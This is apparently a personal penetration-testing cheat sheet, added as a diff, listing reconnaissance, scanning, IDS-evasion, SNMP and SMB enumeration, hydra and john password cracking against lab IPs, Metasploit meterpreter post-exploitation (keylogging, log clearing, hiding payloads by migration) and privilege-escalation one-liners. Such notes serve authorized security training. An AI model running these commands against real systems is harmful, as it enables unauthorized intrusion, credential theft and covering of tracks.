@@ -1,0 +1,297 @@
+---------------------------------------Information Gathering----------------------------------------
+
+Remember to store all the information that you find on the target. This information will be useful for later phases of the pentest, and it will be included in the report. This includes files(check metadata), numbers, emails, names, etc.)
+DNS
+#nslookup something.site
+#nslookup -query=mx something.site
+#nslookup -query=ns something.site
+#nslookup -query=any something.site
+#nslookup
+   >set q=mx
+   >something.site
+   >set q=cname 
+   >www.something.site
+   >exit
+#dig something.site
+#dig something.site A
+#dig +nocmd something.site MX +noall +answer
+#dig +nocmd something.site NS +noall +answer
+#dig +nocmd something.site A +noall +answer
+ZONE Transfer
+#dig something.site AXFR +noall +answer
+#dig +nocmd something.com AXFR +noall +answer @something.com
+Fierce Tool(written in Perl)
+#fierce -dns something.site
+#fierce -dns something.site -dnsserver dns.something.site
+DNS Enum(Another perl script)
+#dnsenum something.site
+#dnsenum something.site --dnsserver dns.something.site
+#dnsenum something.site -f dns-wordlist.txt  (BruteForce option)
+#dnsenum --subfile something.txt -v
+DNS MAP(Discover all target subdomains)
+#dnsmap something.site
+DNS Recon(ALL in one tool)
+#dnsrecon -d something.site (see techniques dnsrecon uses)
+{Remember to try different wordlist, learn these tools, and make them work for you.}
+Maltego Tool (Link information)
+Machines    (maltego scripts that allow us to extarct several bits of information from web and internet)
+Transforms  (programs or scripts that convert information to other information linked to the previous one)
+  >select machine at start
+  >or make own searches using maltego transforms
+Host Discovery and Crafting Packets   (run tools with sudo for better results w/) (check requests with wireshark)
+*Open wireshark
+#wireshark(traffic sniffing tool)
+set interface
+set filter: ip.src==0.0.0.0
+#fping -a 0.0.0.0                            (send a few icmp echo requests to the target ip address)
+#fping -A 0.0.0.0                             (only hosts who are alive)
+#fping -A 0.0.0.0 -r 0                       (specify number of retries)
+#fping -A 0.0.0.0 -e                          (time required to send and recieve packet) (useful for checking if IDS, IPS, or firewall are up)
+#fping -q -a -g 0.0.0.0/24 -r 0 -e       (send icmp to all hosts, dont retry unreachable, return time required to receive response from host, and -q forces fping to be quiet)
+#sudo hping3 -h     (help manual) 
+#sudo hping3 -1 0.0.0.0 -c 3               (works and looks great in wireshark)
+#sudo hping3 --icmp-ts 0.0.0.0 -c 3 -V   ( 
+#sudo hping3 -2 0.0.0.0 -c 3 -V           (sends udp packet)
+#sudo hping3 -S 0.0.0.0 -c 3               (basic host discovery method) (RA reset acknowledged)
+#sudo hping3 -S 0.0.0.0 -c 3 -p 80       (get specific, try different techniques)
+Send different TCP flags
+#sudo hping3 -F 0.0.0.0 -c 3      (FIN Flag)
+#sudo hping3 -U 0.0.0.0 -c 3      (URG Flag)
+#sudo hping3 -X 0.0.0.0 -c 3      (XMS Package)
+#sudo hping3 -Y 0.0.0.0 -c 3      (YMS Flag)
+#sudo hping3 -F -P -U 0.0.0.0 -c 3 
+#sudo hping3 -1 0.0.0.x --rand-dest -I eth0     (may take a while)(Discover multiple host) 
+*Test these commands and inspect all the responses with wireshark. 
+Nmap   (nmap by default uses arp packets) 
+-sn     (ping scan) 
+--disable-arp-ping         (to avoid default arp behavior) 
+-PS    (sends tcp packet with a SYN flag attached, drops connection using rst packet)
+-PS     (port number specified)
+-PA    (sends tcp packet with ACK Flag attached)
+-PU    (UDP packet sent)
+-PY    (send an SCTP INIT packet. only priv users can send)
+-PE     (icmp echo request)
+-PM    (icmp mask request- such packet will probably disclose a lot of info)
+-PP     (time and active hosts)
+Shodun  (searching on shodan.io)  (find anything) 
+Type in:
+Services
+IP Addresses
+www.exploit.shodan.io   (exploit database)
+Scanning 
+https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml   (PPS)
+Wireshark      (Network protocol analyzer) (Only when promiscuous mode is availabe)
+> If the network is protected if the network configuration has switches, you will not be able to capture any traffic that is not addressed to you. You will have to mount attacks such as ARP poisoning.
+Display filters!
+ip.addr=0.0.0.0                          (Display all the traffic sent and recieved by an ip address)
+ip-src=0.0.0.0                            (filter packets sent from a specific address)
+ip.dest=0.0.0.0                           (destination of the ip address)
+Filter by protocols                       (arp, icmp, http, dns | “http or dns”)
+ip.addr==0.0.0.0 and (dns or http)    (specify multiple filters)
+http and ip.src!=0.0.0.0                (avoid capturing http packets sent from the specified ip)
+tcp.port==22                              (apply filters during phases | ssh requests sent during ssh test) 
+tcp.flags.syn==1                         (capture all packets that have the syn flag enabled)
+tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==0.0.0.0/24
+tcp contains “string”                     (search for strings contained in tcp packets)
+>create filter starting from an actual packet
+  -right click on packet capture
+  -Apply as filter
+  -Selected
+>follow tcp streams                     (specify packets you want to see)
+HPING
+#hping3 -h                             (help)
+#hping3  -S -p 80 -c 3 0.0.0.0     (SYN scan on port 80 w/ 3 packets sent) (SYN SYN:ACK RST)
+#hping3 -S --scan 1-1000 0.0.0.0  
+#hping3 -2 --scan 1-1000 0.0.0.0      (UDP scan)
+#hping3 -F -P -U 0.0.0.0 -c 3          (christmas scan)
+# -V     (verbose)
+#hping3 --scan 1-1000 0.0.0.0          (null scan - tcp packet without any flags specified)
+NMAP
+#sudo nmap -sS 0.0.0.0 -d -p 80 (syn scan)
+#sudo nmap -sS 0.0.0.0 -n -Pn -p 80 (-Pn treat target as online) ( -n avoid dns resolution)
+#sudo nmap -sT 0.0.0.0 -F     (TCP connect scan and fast scan )
+#sudo nmap -sU 0.0.0.0 -p 1-1000  (udp connect scan) 
+#sudo nmap -sN 0.0.0.0 -p ports   (tcp null scan)
+#sudo nmap -sX 0.0.0.0   --top-ports 200 (christmas scan) 
+#sudo nmap -sF 0.0.0.0    (FIN flag scan)
+#sudo nmap --scanflags URG 0.0.0.0   (scan specific flags)
+#sudo nmap -A 0.0.0.0 -F (aggressive fast scan) 
+#sudo nmap -Pn 0.0.0.0 (treat target as online) 
+NMAP NSE  (Nmap Scripting System) 
+Location: /usr/share/nmap/scripts/
+sudo nmap -sC        (default scripts to use)
+#sudo nmap --script-help “smb” and discovery  (search for scripts related to smb and discovery)
+#sudo nmap --script-updatedb
+#sudo nmap --script whois-domain site.com -sn
+#sudo nmap --script smb-os-discovery -p 445 0.0.0.0
+#sudo nmap --script -O 0.0.0.0 -p 445
+#sudo nmap --script smb-enum-shares 0.0.0.0 -p 445 
+#sudo nmap --script auth 0.0.0.0 (execute all scripts in auth cat)
+#sudo nmap --script default 0.0.0.0 (info to system, netbios, workgroup, etc)
+#sudo nmap --script 
+#sudo nmap --script 
+IDLE SCAN   (inspect with Wireshark)
+sudo hping3 -S -r 0.0.0.0(zombie IP) -p 135 (id+1 doesnt talk to other machines on the network good zombie canidate) (keep going and then run the second coomand to see if ID increments by two)
+sudo hping3 -a 0.0.0.0(zombie ip address) -S 0.0.0.0(target ip address)  (return to first command window- Change?)
+sudo hping3 -a 0.0.0.0(zombie ip address) -S 0.0.0.0 -p 200(target ip address)  (return to first command window- Change?)
+sudo nmap --script ipidseq 0.0.0.0 -p 135 (run idle scan on potential zombie canidate) 
+sudo nmap -O -v 0.0.0.0 -p 135 (Another way!) (is it incremental)
+sudo nmap -sI 0.0.0.0:port(zombie) 0.0.0.0(target) -p 23 -Pn --packet-trace (sometimes port may be filtered- could be a false negative) 
+sudo hping3 -S -r 0.0.0.0 -p 135 
+sudo nmap -S 0.0.0.0(zombie) 0.0.0.0(target) -p 23 -Pn -n -e tap0 --disable-arp-ping  (sometimes manual checks may be more accurate than the automatic)
+-----------------Banner Grabbing-------------------
+Simply connecting using various services:
+ncat 0.0.0.0 00
+nc 0.0.0.0 00
+telnet 0.0.0.0 00
+nmap 0.0.0.0 --version-intensity <level>(0-9)
+OS Fingerprinting
+sudo nmap -O -n 0.0.0.0 (Active OS fingerprinting)
+sudo p0f -i eth0 (passive OS Fingerprinting)
+---------------Firewall/IDS Evasion----------------------------
+Fragmentation
+Splitting a single packet into smaller ones.
+> This can disable the ability of some Firewall or IDS systems to either apply their packet filtering rules or, to process all the fragments. They may inspect the single fragment, but not the whole packet.
+• Modern iDSs have the ability to rebuild fragmented packets. So may not always work.
+# nmap -sS -f 0.0.0.0 (-f = fragment packets)
+# sudo nmap -f 0.0.0.0 -n -p 80 --disable-arp-ping -Pn (no extra packets displayed on wireshark)
+# sudo nmap -f 0.0.0.0 -p 80 -Pn --data-length 100 --disable-arp-ping (more bytes will cause more fragments)
+# sudo nmap -f -f -sS 0.0.0.0 -p 80 -Pn -n --disable-arp-ping  (add another -f argument cause fragment to become 16 bytes instead of 8)
+• Can also use --mtu to specify a custom ofset size. Must be a multiple of eight. 
+• Use wireshark to check fragmentation
+Decoys
+Add noise to the IDS by sending scans from spoofed IP addresses. As a result, a bunch of forged IP's(decoys) will appear on the IDS, along with the attackers real IP, confusing the analyst.
+• A couple considerations with this method:
+   ◇ All decoys need to be up and running
+   ◇ The real IP address shoudl appear in random order to the IDS
+   ◇ ISPs traversed by spoofed traffic lets the traffic go through.
+# sudo nmap -sS -D 0.0.0.0,ME,0.0.0.0 [target 0.0.0.0]  (ME identifies our position. No ME randomizes our position)
+# sudo nmap -D RND:10 0.0.0.0 -sS -p 80 -Pn --disabled-arp-ping   (generate random decoys that dont exsist on the network)
+# sudo hping3 --rand-source -S -p 80 0.0.0.0 -c 3    (generate random spoofed IPs) 
+# sudo hping3 -a 0.0.0.0 -S -p 80 0.0.0.0 (force tcp scan on port 80, spoofing the ip addess of one of the machines in the network)
+Timing  Adding Delays!
+Slow down the scan in order to blend with other traffic in the logs of the Firewall/IDS
+nmap -sS -T[0~5] 0.0.0.0
+Source Port
+simple method of changing source port. Poorly configured firewalls may allows traffic coming from certain ports.
+• 53 (DNS replies) and 20 (active FTP) are very commonly accepted
+nmap -sS --source-port 53 0.0.0.0
+nmap -g 80 -sS 0.0.0.0/24
+hping3 -S -s 53 --scan known 0.0.0.0
+More info on Firewall and IDS evasion
+http://nmap.org/book/man-bypass-firewalls-ids.html
+------------Advanced Port Scanning-------------
+#sudo nmap -sS --data-length 10 -p 21 0.0.0.0  (add 10 extra bytes into packet header) (Take advantage of firewalls relying on misconfigurations when check packet headers)
+# sudo hping3 -S -p 21 --data 24 0.0.0.0 
+# sudo nmap --spoof-mac apple 0.0.0.0 -p 80 -Pn --disable-arp-ping -n (spoof MAC address to popular )
+# sudo nmap --spoof-mac 0 0.0.0.0 -p 80 -Pn --disable-arp-ping -n (choose a random MAC)
+# sudo nmap --spoof-mac 00:11:22:33:44:55 0.0.0.0 -p 80 -Pn --disable-arp-ping -n (choose a specific MAC)
+# sudo vim hosts.lists <input IPs>
+# sudo nmap -iL hosts.lists -sS -p 80,443,135,5555,21,22 --randomize-hosts  (randomize the host during the scan)
+# sudo nmap -iL hosts.list -sS -p 80,443,135,5555,21,22 --randomize-hosts -T 2   (perform slow scan and randomize the hosts)
+# sudo hpin3 -1 --rand-dest 0.0.0.X -I eth0
+#sudo hping3 -S --scan 80,443,21,22 0.0.0.0 -i u10  (u for microseconds)
+NetBIOS
+nbtstat - A tool developed to troubleshoot NetBIOS name resolution problems.
+#nbtstat -A 0.0.0.0    (get info om our target)
+• Watch for <20>    (means host has file and printer shares enabled)
+#nbtscan -v 0.0.0.0 or 0.0.0.0/24
+#net view 0.0.0.0 (windows cli) 
+#net use
+#mount command (linux)
+#dumpsec (auditing tool for netbios- windows)
+#enum4linux
+#rpcclient -N -U “” 0.0.0.0
+#nat.exe userlist passlist ip
+#enum4linux                  (enumerate data from windows and samba host) (uses polenum, ldapscripts)
+#enum4linux -a -v 0.0.0.0
+The SID ending with the value 500 inidicates Adminstartive account 
+SNMP (Simple Network Management Protocol)
+IN SNMP there is a manager(usually system admin) and a number of agents.
+#snmpwalk -c public -v1 0.0.0.0 hrSWInstalledName   (Using specific OID to gather information)
+#snmpwalk -v 2c -c public 0.0.0.0 hrMemorySize      (get the size of the memory on the machine)
+#snmpwalk -v 2c -c public 0.0.0.0 system.sysContact
+#snmpset -v 2c -c public 0.0.0.0 system.syscontact s new@els.com    (set new snmp values)
+#snmkwalk -v 2c -c public 0.0.0.0 system.sysContact
+→ STRING: new@els.com
+NMAP SNMP Scripts
+• snmp-brute
+• snmp-info
+• snmp-interfaces
+• snmp-netstat
+• snmp-processes
+• snmp-sysdescr
+• snmp-win32-services
+• List all with: usr/share/nmap/scripts$ ls -1 | grep -i snmp
+• EX: nmap -sU -p 161 --script=(script_name> 0.0.0.0
+# sudo nmap -sU -p 161 --script=snmp-win32-services 0.0.0.0   (get info on services available on target machine)
+# sudo nmap -sU -p 161 --script=snmp-win32-users 0.0.0.0 
+# sudo nmap -sU -p 161 0.0.0.0 --script snmp-brute   (brute force to look for correct string to use) (custom wordlist with: snmp-brute.communitiesdb=<wordlist>)
+	* Seclist offers a great wordlist: /usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt
+----------------------Samba Enumeration---------------------------
+Samba is a windows compatible file sharing system. It is used to set up windows share on Linux systems. Samba is a Linux implementation of the SMB/CIFS protocol. Samba can be used to set up storage server or sharing files and directories on the Linux system.
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.7.150
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.7.150
+enum4linux
+Traffic Sniffing and MitM Attacks
+#sudo tcpdump -i tun0
+#sudo tcpdump -xxAXXSs 0 dst 0.0.0.0 (set MTU size to 0 to capture then entire packet)
+#sudo tcpdump -i tun0 -vvvASs 0 dst 0.0.0.0 (simpler output)
+*when using tcpdump we have to decode the info manually
+#echo iwunciuninwiuenc32== | base64 -d
+windump fro windows (uses all the sam  options)
+#sudo ettercap -G
+Password Cracking
+#cat words.txt | rsmangler --file - > words_new.txt   (take a simple text file with a few words and create a much larger file with many different variations and combinations of the words)
+#cewl -m 8 http://www.google.com
+#medusa -h 0.0.0.0 -M ssh -U users.txt -P pass.txt
+#hyrda -L user.txt -P pass.txt ssh://0.0.0.0 -T 55 (really fast, but not very efficient)
+#hydra -L users.txt -P pass.txt ftp://0.0.0.0 -T 5
+#patator 
+Cracking passphrase on encrypted id_rsa file
+#ssh2john id_rsa_file   (Puts it in a readable format for john)
+#ssh2john id_rsa_fil > john.txt       (transfer into text file for john to crack) 
+#john john.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Cracking Website Logins Pages
+└─$ hydra -l Elliot -P fsocity.dic 10.10.232.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30 
+└─$ hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.83.195 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -t 30
+*if you find diiferent error messages for failed login or password; this is a reportable pentesting find. Seeing this means we can test for usernames and passwords
+*hash-identifier
+-----------------------Metasploit--------------------------
+Searching
+search type:exploit platform: windows
+search author:HDM
+search cve:2015
+Metasploit Deeper
+meterpreter#help
+meterpreter#background (backgrounds session)
+meterpreter#sessions (shows sessions)
+meterpreter#session -i sess_id (go back to session)
+meterpreter#ifconfig  (grab network config of machine)
+meterpreter#sysinfo   (grab info on the machine) (note down all this info during pentest)
+meterpreter#cat file
+meterpreter#download file_path (replace single slashes with double slashes)
+meterpreter#upload file dest_file_path
+meterpreter#edit file
+meterpreter#execute -f program -i H (like command exe)
+meterpreter#shell   (interact with command prompt)
+meterpreter#search -f string.*   (search for files, etc)
+meterpreter#run post/ tabtab
+meterpreter#run post/windows/gather/enum_applications
+meterpreter#run post/windows/gather/enum_services
+meterpreter#ps   (list all processes run on the system)
+meterpreter#getpid payload.exe
+meterpreter#run post/windows/manage/migrate
+meterpreter#migrate ID(process id) (hide our payload from the task manager)
+meterpreter#keyscan_start   (capture keystrokes)
+meterpreter#keyscan_dump   (dump the keystrokes)
+meterpreter#keyscan_stop 
+meterpreter#clearev
+------------------------SHELLS----------------------
+python -c 'import pty; pty.spawn("/bin/bash")'   (upgrade shell)
+Privilage Escalation 
+find / -perm +6000 2>/dev/null | grep ‘/bin/’        (search for suid binaries that will allow us to escalate to su)
+ find / -user root -perm -4000 -exec ls -ldb {} \;   (search for all suid files)
+getcap -r / 2>/dev/null                                     (enumeration for priv esc)
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'    (abuse perl with set cap_setuid+ep)
+https://gtfobins.github.io/                                (breakout of restricted areas)
